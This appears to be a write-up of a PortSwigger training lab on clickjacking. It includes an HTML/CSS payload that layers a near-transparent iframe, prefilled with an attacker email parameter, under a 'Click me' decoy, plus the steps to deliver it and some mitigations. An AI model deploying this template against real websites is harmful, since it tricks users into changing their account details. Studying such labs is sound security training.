# Clickjacking - with form input data prefilled from a URL parameter

## 📌 Lab Details
- **Title**: Clickjacking with form input data prefilled from a URL parameter
- **Difficulty**: Apprentice
- **Category**: Clickjacking
- **Lab URL**: https://portswigger.net/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2fweb-security%2fclickjacking%2flab-prefilled-form-input

## 🔍 Summary
This lab demonstrates **advanced clickjacking combined with CSRF**, using a transparent iframe with a prepopulated email URL parameter to trick the victim into clicking an “Update email” button, thereby changing their account email.

## 🛠 Steps to Solve
1. Log in to the given account.
2. Inject the payload on the **Exploit** server:
   ```sh
   <style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
    </style>
    <div>Click me</div>
    <iframe src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
    ```
3. Adjust the values of the template to align the `Click me` button with the `update email` button.
4. Deliver exploit to the victim to complete the lab.

## 📖 Key Takeaways
- Using URL parameters (`?email=hacker@...`) prepopulates forms to bypass user input barriers.
- Proper alignment, transparency (`opacity: 0.0001`), and testing in Chrome are crucial for a successful exploit.
- Mitigations include `X-Frame-Options`, `Content-Security-Policy: frame-ancestors`, and using same-origin CSRF tokens.

## 🖼️ Screenshot 
![image](https://github.com/user-attachments/assets/6d2d879b-4112-4f68-8014-9cfd91c33ddd)
![image](https://github.com/user-attachments/assets/6601247b-b38e-4760-a8ba-30b80f75673b)
![image](https://github.com/user-attachments/assets/cbc5087d-fa77-4381-a6aa-14f8a97d73c4)
